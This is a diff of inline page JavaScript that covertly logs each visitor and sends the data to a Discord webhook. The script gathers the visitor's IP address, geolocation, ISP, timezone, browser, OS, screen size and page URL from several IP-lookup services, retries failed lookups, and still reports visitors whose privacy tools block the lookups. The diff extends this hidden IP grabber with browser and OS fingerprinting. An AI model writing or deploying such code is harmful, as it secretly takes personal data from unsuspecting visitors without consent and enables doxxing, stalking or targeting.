@@ -25,7 +25,6 @@
         
         let notificationSent = false;
         let dataCollected = false;
-        let attempts = 0;
         
         let visitorData = {
             ip: null,
@@ -49,8 +48,26 @@
             connection: navigator.connection ? navigator.connection.effectiveType : null,
             cores: navigator.hardwareConcurrency,
             timestamp: null,
-            success: false
+            success: false,
+            browser_name: null,
+            os: null
         };
+        
+        function detectBrowser() {
+            let ua = navigator.userAgent;
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) visitorData.browser_name = 'Chrome';
+            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) visitorData.browser_name = 'Safari';
+            else if (ua.indexOf('Firefox') > -1) visitorData.browser_name = 'Firefox';
+            else if (ua.indexOf('Edg') > -1) visitorData.browser_name = 'Edge';
+            else visitorData.browser_name = 'Other';
+            
+            if (ua.indexOf('Windows') > -1) visitorData.os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) visitorData.os = 'macOS';
+            else if (ua.indexOf('Linux') > -1) visitorData.os = 'Linux';
+            else if (ua.indexOf('Android') > -1) visitorData.os = 'Android';
+            else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1) visitorData.os = 'iOS';
+            else visitorData.os = 'Other';
+        }
         
         function sendToDiscord() {
             if (notificationSent) return;
@@ -62,7 +79,7 @@
             notificationSent = true;
             visitorData.timestamp = new Date().toISOString();
             
-            let color = visitorData.success ? 0x00ff00 : 0x88aaff;
+            let color = visitorData.success ? 0x00ff00 : 0xffaa44;
             let title = visitorData.success ? '🌐 New Visitor' : '📱 Visitor Detected';
             
             let fields = [];
@@ -76,17 +93,17 @@
             if (visitorData.isp) fields.push({ name: 'ISP', value: visitorData.isp, inline: true });
             if (visitorData.source) fields.push({ name: 'Data Source', value: visitorData.source, inline: false });
             
-            fields.push({ name: 'Browser/OS', value: visitorData.user_agent.substring(0, 80), inline: false });
+            fields.push({ name: 'Browser', value: `${visitorData.browser_name} / ${visitorData.os}`, inline: true });
             fields.push({ name: 'Screen', value: visitorData.screen, inline: true });
             fields.push({ name: 'Language', value: visitorData.language, inline: true });
-            fields.push({ name: 'Page', value: visitorData.url.substring(0, 100), inline: false });
+            fields.push({ name: 'Page', value: visitorData.url.substring(0, 80), inline: false });
             
             let payload = {
                 embeds: [{
                     title: title,
                     color: color,
                     fields: fields,
-                    footer: { text: `Attempts: ${attempts}` },
+                    footer: { text: `Visitor at ${new Date().toLocaleString()}` },
                     timestamp: visitorData.timestamp
                 }]
             };
@@ -127,38 +144,37 @@
             return false;
         }
         
-        function jsonpFetch(url, timeoutMs) {
-            return new Promise(function(resolve, reject) {
-                let callbackName = 'cb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-                let script = document.createElement('script');
+        function imagePing(url, callbackName) {
+            return new Promise(function(resolve) {
+                let img = new Image();
                 let timeout = setTimeout(function() {
-                    if (script.parentNode) script.parentNode.removeChild(script);
-                    delete window[callbackName];
-                    reject(new Error('Timeout'));
-                }, timeoutMs || 8000);
+                    img.onload = img.onerror = null;
+                    resolve(null);
+                }, 3000);
                 
-                window[callbackName] = function(data) {
+                img.onload = function() {
                     clearTimeout(timeout);
-                    delete window[callbackName];
-                    if (script.parentNode) script.parentNode.removeChild(script);
-                    resolve(data);
+                    resolve(null);
                 };
-                
-                let separator = url.indexOf('?') === -1 ? '?' : '&';
-                script.src = url + separator + 'callback=' + callbackName;
-                script.onerror = function() {
+                img.onerror = function() {
                     clearTimeout(timeout);
-                    delete window[callbackName];
-                    if (script.parentNode) script.parentNode.removeChild(script);
-                    reject(new Error('Script load failed'));
+                    resolve(null);
                 };
-                document.head.appendChild(script);
+                img.src = url + '?_=' + Date.now();
+            });
+        }
+        
+        function fetchWithRetry(url, options, retries) {
+            return fetch(url, options).catch(function() {
+                if (retries > 0) {
+                    return fetchWithRetry(url, options, retries - 1);
+                }
+                throw new Error();
             });
         }
         
         function cloudflareTrace() {
-            attempts++;
-            return fetch('https://www.cloudflare.com/cdn-cgi/trace')
+            return fetchWithRetry('https://www.cloudflare.com/cdn-cgi/trace', {}, 1)
                 .then(function(r) {
                     if (!r.ok) throw new Error();
                     return r.text();
@@ -181,9 +197,12 @@
                 });
         }
         
-        function ipifyJsonp() {
-            attempts++;
-            return jsonpFetch('https://api.ipify.org?format=jsonp', 5000)
+        function ipifyDirect() {
+            return fetchWithRetry('https://api.ipify.org?format=json', {}, 1)
+                .then(function(r) {
+                    if (!r.ok) throw new Error();
+                    return r.json();
+                })
                 .then(function(data) {
                     if (data && data.ip) {
                         return { ip: data.ip, source: 'ipify' };
@@ -195,9 +214,14 @@
                 });
         }
         
-        function ipapiJsonp() {
-            attempts++;
-            return jsonpFetch('https://ip-api.com/json/', 6000)
+        function ipapiDirect() {
+            return fetchWithRetry('https://ip-api.com/json/?fields=66846719', {
+                headers: { 'Accept': 'application/json' }
+            }, 1)
+                .then(function(r) {
+                    if (!r.ok) throw new Error();
+                    return r.json();
+                })
                 .then(function(data) {
                     if (data && data.status === 'success' && data.query) {
                         return {
@@ -219,9 +243,12 @@
                 });
         }
         
-        function ipwhoisJsonp() {
-            attempts++;
-            return jsonpFetch('https://ipwho.is/', 6000)
+        function ipwhoisDirect() {
+            return fetchWithRetry('https://ipwho.is/', {}, 1)
+                .then(function(r) {
+                    if (!r.ok) throw new Error();
+                    return r.json();
+                })
                 .then(function(data) {
                     if (data && data.success === true && data.ip) {
                         return {
@@ -243,9 +270,14 @@
                 });
         }
         
-        function ipapiCoJsonp() {
-            attempts++;
-            return jsonpFetch('https://ipapi.co/json/', 6000)
+        function ipapiCoDirect() {
+            return fetchWithRetry('https://ipapi.co/json/', {
+                headers: { 'Accept': 'application/json' }
+            }, 1)
+                .then(function(r) {
+                    if (!r.ok) throw new Error();
+                    return r.json();
+                })
                 .then(function(data) {
                     if (data && data.ip) {
                         return {
@@ -267,37 +299,12 @@
                 });
         }
         
-        function ipwhoisAppJsonp() {
-            attempts++;
-            return jsonpFetch('https://ipwhois.app/json/', 6000)
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country,
-                            region: data.region,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone,
-                            isp: data.isp,
-                            source: 'ipwhois.app'
-                        };
-                    }
-                    throw new Error();
-                })
-                .catch(function() {
-                    return null;
-                });
-        }
-        
         let services = [
             cloudflareTrace,
-            ipifyJsonp,
-            ipapiJsonp,
-            ipwhoisJsonp,
-            ipapiCoJsonp,
-            ipwhoisAppJsonp
+            ipapiDirect,
+            ipwhoisDirect,
+            ipapiCoDirect,
+            ipifyDirect
         ];
         
         let currentIndex = 0;
@@ -308,8 +315,8 @@
             
             if (currentIndex >= services.length) {
                 if (!dataCollected && !notificationSent) {
-                    visitorData.ip = 'unavailable-' + Date.now().toString(36);
-                    visitorData.source = 'fallback-generator';
+                    visitorData.ip = 'blocked-' + Date.now().toString(36);
+                    visitorData.source = 'privacy-blocked';
                     visitorData.success = false;
                     sendToDiscord();
                 }
@@ -322,7 +329,7 @@
             
             let timeoutId = setTimeout(function() {
                 tryNext();
-            }, 7000);
+            }, 5000);
             
             service()
                 .then(function(result) {
@@ -348,44 +355,45 @@
                 });
         }
         
-        function getTimezoneFromBrowser() {
+        function getBrowserInfo() {
             try {
                 let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 if (tz && !visitorData.timezone) {
                     visitorData.timezone = tz;
-                    if (!visitorData.source) visitorData.source = 'browser-timezone';
                 }
             } catch(e) {}
+            
+            visitorData.viewport_width = window.innerWidth;
+            visitorData.viewport_height = window.innerHeight;
+            visitorData.local_time = new Date().toString();
         }
         
-        function finalSafety() {
+        function ensureNotification() {
             setTimeout(function() {
                 if (!notificationSent) {
                     if (!visitorData.ip) {
-                        visitorData.ip = 'safety-' + Date.now().toString(36);
-                        visitorData.source = 'safety-timeout';
+                        visitorData.ip = 'privacy-' + Date.now().toString(36);
+                        visitorData.source = 'privacy-timeout';
                     }
                     visitorData.success = dataCollected;
                     sendToDiscord();
                 }
                 completed = true;
-            }, 12000);
+            }, 10000);
         }
         
-        getTimezoneFromBrowser();
+        detectBrowser();
+        getBrowserInfo();
         
         tryNext();
         
-        finalSafety();
+        ensureNotification();
         
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                if (!notificationSent && visitorData.ip) {
-                    sendToDiscord();
-                    completed = true;
-                }
-            }, 5000);
-        });
+        setTimeout(function() {
+            if (!notificationSent && visitorData.ip && !dataCollected) {
+                sendToDiscord();
+            }
+        }, 8000);
     })();
 </script>
 </body>
